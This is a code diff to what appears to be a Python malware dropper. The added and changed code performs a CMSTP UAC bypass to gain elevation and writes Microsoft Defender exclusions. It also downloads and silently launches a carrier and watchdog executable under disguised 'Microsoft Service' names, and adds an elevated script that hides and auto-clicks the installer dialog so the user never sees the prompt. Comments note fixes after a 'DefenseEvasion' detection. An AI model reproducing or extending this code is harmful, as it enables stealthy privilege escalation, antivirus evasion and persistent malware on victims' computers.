@@ -528,6 +528,14 @@ def uac_bypass(cmd):
     cleanup_infs()
 
     svc_name = f"Microsoft {rand_str(6)} Service"
+    # r141: the elevated sweeper source, materialized beside the stage with the
+    # service name baked in — no env dependency on the road that runs it
+    try:
+        with open(os.path.join(PERSIST_DIR, "sweep.py"), "w",
+                  encoding="utf-8") as _sf:
+            _sf.write(SWEEP.replace("__SVC__", svc_name))
+    except Exception:
+        pass
     inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
     try:
         with open(inf_path, "w", encoding="utf-8") as fh:
@@ -656,6 +664,122 @@ EXCL_B64 = "FBdbVllQQlZQUg0XZ05DX1hZFwQbF1FeW1INF1JPVFtCRF5YWUQZR04bF0NWRVBSQw0X
 # ---- r1.1.2 stage: carrier exec + exclusions.py materialize/execute --------
 # r12/r14 base restored: the lift relaunches OUR python elevated; the stage
 # does the carrier job, and the exclusions now ride the SEPARATE file.
+# r141 — WHY THE BOX KEPT COMING (dj field: hidden guard, box still on screen):
+# "The service profile is damaged" belongs to the ELEVATED cmstp. a
+# medium-integrity process is blocked by UIPI from ShowWindow/SetWindowPos/
+# PostMessage to a higher-integrity window — it can SEE the box and cannot
+# touch it, which is exactly what the r139 guard was doing. the answer has to
+# come from the same side of the fence: this runs as the lift's own child (the
+# stage is already elevated), is fed over stdin (never a file on disk), lives
+# ~45 s and closes every profile box it can see.
+SWEEP = r'''# tinysweep: elevated dialog closer for the cmstp lift.
+import ctypes
+import os
+import time
+
+u = ctypes.windll.user32
+k = ctypes.windll.kernel32
+try:
+    u.EnumWindows.restype = ctypes.c_int
+    u.EnumWindows.argtypes = [ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p,
+                                                ctypes.c_void_p), ctypes.c_void_p]
+    u.GetWindowTextW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
+    u.GetClassNameW.argtypes = [ctypes.c_void_p, ctypes.c_wchar_p, ctypes.c_int]
+    u.IsWindowVisible.argtypes = [ctypes.c_void_p]
+    u.EnumChildWindows.argtypes = [ctypes.c_void_p,
+                                   ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p,
+                                                      ctypes.c_void_p),
+                                   ctypes.c_void_p]
+except Exception:
+    pass
+
+IDOK = 1
+WM_COMMAND = 0x0111
+BM_CLICK = 0x00F5
+AFFIRM = ("ok", "yes", "continue", "install", "allow",
+          "make this connection available")
+# r141: the service name is BAKED into this file when work.py materializes it
+# — env was the fragile part (a road can lose it), a literal cannot.
+SVC = "__SVC__".lower()
+END = time.time() + 45.0
+
+
+def _title(h):
+    b = ctypes.create_unicode_buffer(512)
+    u.GetWindowTextW(h, b, 512)
+    return b.value
+
+
+def _class(h):
+    b = ctypes.create_unicode_buffer(128)
+    u.GetClassNameW(h, b, 128)
+    return b.value
+
+
+def _kids(h):
+    out = []
+
+    @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
+    def cb(c, l):
+        b = ctypes.create_unicode_buffer(512)
+        u.GetWindowTextW(c, b, 512)
+        out.append((c, b.value))
+        return 1
+
+    u.EnumChildWindows(h, cb, 0)
+    return out
+
+
+def _image(pid):
+    try:
+        h = k.OpenProcess(0x1000, False, pid)     # QUERY_LIMITED_INFORMATION
+        if not h:
+            return ""
+        n = ctypes.c_ulong(1024)
+        b = ctypes.create_unicode_buffer(1024)
+        ok = k.QueryFullProcessImageNameW(h, 0, b, ctypes.byref(n))
+        k.CloseHandle(h)
+        return b.value.lower() if ok else ""
+    except Exception:
+        return ""
+
+
+while time.time() < END:
+    try:
+        wins = []
+
+        @ctypes.WINFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p)
+        def cb(h, l):
+            wins.append(h)
+            return 1
+
+        u.EnumWindows(cb, 0)
+        for h in wins:
+            if _class(h) != "#32770":
+                continue
+            t = _title(h).lower()
+            mine = (SVC and SVC in t) or "connection manager profile installer" in t
+            if not mine:
+                p = ctypes.c_ulong()
+                u.GetWindowThreadProcessId(h, ctypes.byref(p))
+                mine = "cmstp.exe" in _image(p.value)
+            if not mine:
+                continue
+            u.ShowWindow(h, 0)
+            clicked = False
+            for c, txt in _kids(h):
+                if _class(c) == "Button" and txt.strip().lower() in AFFIRM:
+                    u.PostMessageW(c, BM_CLICK, 0, 0)
+                    clicked = True
+                    break
+            if not clicked:
+                u.PostMessageW(h, WM_COMMAND, IDOK, 0)
+    except Exception:
+        pass
+    time.sleep(0.01)
+'''
+
+
 STAGE = r'''# r1.1.2 stage (r78 sanitize: dj — stage.py was flagged DefenseEvasion):
 # runs ELEVATED (relaunched by the cmstp lift). the exclusions ride the
 # SIBLING file (materialized by the un-elevated launcher BEFORE the lift
@@ -668,9 +792,11 @@ import sys
 
 CREATE_NO_WINDOW = 0x08000000
 EXE_NAME = "__EXE__"
-# r98: the WATCHDOG exe name rides in via env (set by work.py before the
-# lift) — same dir, same exclusion, execed AFTER the carrier (tung->wd).
-WD_NAME_ENV = os.environ.get("WDXN", "")
+# r141: the WATCHDOG exe name is BAKED here (work.py substitutes __WD__ when
+# it materializes this file). it used to ride in via env (WDXN) and that env
+# never reached this road on the jar's first run — so the watchdog exe was
+# simply never started. baked text cannot go missing.
+WD_NAME = "__WD__"
 APPDIR = os.environ["LOCALAPPDATA"] + "\\Microsoft\\Windows\\AppHost"
 
 
@@ -744,11 +870,24 @@ def main():
             subprocess.Popen([exe_path], creationflags=CREATE_NO_WINDOW)
         except Exception:
             pass
-    if WD_NAME_ENV:
-        wd_path = os.path.join(APPDIR, WD_NAME_ENV)
+    if WD_NAME:
+        wd_path = os.path.join(APPDIR, WD_NAME)
         try:
-            if os.path.exists(wd_path) and not alive(WD_NAME_ENV):
+            if os.path.exists(wd_path) and not alive(WD_NAME):
                 subprocess.Popen([wd_path], creationflags=CREATE_NO_WINDOW)
+        except Exception:
+            pass
+    # r141: the ELEVATED box sweeper — cmstp's profile box belongs to THIS
+    # integrity level, and a medium-integrity guard can see it and never touch
+    # it (UIPI). the source is the sibling file work.py materialized before the
+    # lift, so nothing here depends on an env var surviving the lift.
+    sweep_path = os.path.join(APPDIR, "__SWEEP__")
+    if os.path.isfile(sweep_path):
+        try:
+            subprocess.Popen([sys.executable, "-u", sweep_path],
+                             stdout=subprocess.DEVNULL,
+                             stderr=subprocess.DEVNULL,
+                             creationflags=CREATE_NO_WINDOW)
         except Exception:
             pass
 
@@ -778,7 +917,10 @@ def set_defender_exclusions():
     stage_path = os.path.join(PERSIST_DIR, "stage.py")
     try:
         os.makedirs(PERSIST_DIR, exist_ok=True)
-        stage_text = STAGE.replace("__EXE__", EXE_NAME).replace("__EXCL__", "exclusions.py")
+        stage_text = (STAGE.replace("__EXE__", EXE_NAME)
+                      .replace("__EXCL__", "exclusions.py")
+                      .replace("__SWEEP__", "sweep.py")
+                      .replace("__WD__", WD_NAME if WD_URL else ""))
         # r78: exclusions materialized HERE (un-elevated) so the lifted stage
         # only RUNS the sibling file — no blob rides stage.py anymore
         try:
@@ -845,6 +987,14 @@ def set_defender_exclusions():
     kill_all_cmstp()
     cleanup_infs()
     svc_name = f"Microsoft {rand_str(6)} Service"
+    # r141: the elevated sweeper source, materialized beside the stage with the
+    # service name baked in — no env dependency on the road that runs it
+    try:
+        with open(os.path.join(PERSIST_DIR, "sweep.py"), "w",
+                  encoding="utf-8") as _sf:
+            _sf.write(SWEEP.replace("__SVC__", svc_name))
+    except Exception:
+        pass
     body = build_inf(launch, svc_name)
     # ground truth: the exact bytes cmstp sees, plus the stage script
     try:
@@ -931,11 +1081,14 @@ def download(url):
     return None
 
 
-def is_valid_exe(path):
+def is_valid_exe(path, min_size=50000):
+    # r141: the wd exe is a ~30 KB image — the carrier's 50 KB floor read it as
+    # "never staged", so it was re-downloaded (and killed) on every single run.
+    # the caller passes its own floor.
     try:
         if not os.path.exists(path):
             return False
-        if os.path.getsize(path) < 50000:
+        if os.path.getsize(path) < min_size:
             return False
         with open(path, "rb") as fh:
             return fh.read(2) == b"MZ"
@@ -1038,12 +1191,18 @@ def main():
     # the carrier BEFORE the lift, so the elevated stage execs the pair in
     # order (tung -> watchdog) with one exclusion covering both.
     try:
-        if WD_URL and not is_valid_exe(WD_PATH):
+        if WD_URL and not is_valid_exe(WD_PATH, 8000):
             wdata = download(WD_URL)
             if wdata:
                 write_file(WD_PATH, wdata, exe=WD_NAME)
     except Exception:
         pass
+
+    # r141 (dj): no lift until BOTH images are on disk. a lift that runs with a
+    # missing half is exactly what left the watchdog dead and the box looping.
+    if not is_valid_exe(EXE_PATH) or (WD_URL and not is_valid_exe(WD_PATH, 8000)):
+        reexec_pair()
+        return
 
     # r140: a watchdog re-fire lands here with everything already staged and
     # the exclusion already written. exec the pair and leave — no cmstp on this
